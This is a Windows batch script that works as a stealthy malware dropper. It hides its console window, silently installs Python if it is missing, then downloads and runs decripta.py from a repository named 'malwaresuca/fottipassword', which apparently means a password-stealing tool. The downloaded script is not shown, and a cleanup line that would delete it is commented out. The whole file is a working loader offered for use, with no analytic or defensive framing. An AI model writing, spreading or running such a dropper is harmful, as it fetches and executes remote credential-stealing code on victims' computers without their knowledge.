@echo off
powershell -WindowStyle Hidden -Command "Add-Type -Name ConsoleUtils -Namespace System.Console -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; [System.Console.ConsoleUtils]::ShowWindow([System.Console.ConsoleUtils]::GetConsoleWindow(), 0)"

python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe', 'python_installer.exe')"

    python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_launcher=0
)

curl -o decripta.py https://raw.githubusercontent.com/malwaresuca/fottipassword/main/decripta.py

python decripta.py

::del decripta.py